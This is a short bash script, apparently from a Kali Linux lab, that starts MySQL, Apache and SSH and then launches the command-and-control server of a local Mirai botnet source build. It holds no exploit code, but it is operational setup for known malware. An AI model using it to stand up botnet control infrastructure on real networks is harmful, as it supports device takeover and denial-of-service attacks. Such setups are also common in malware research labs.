#!/bin/bash
sudo service mysql start
sudo service apache2 start
sudo service ssh start

# setting path to Mirai source Folder
pathToMirai=/home/kali/Desktop/MiraiRepository/mirai/MiraiSourceCode
export pathToMirai

# launching cnc
$pathToMirai/mirai/debug/cnc
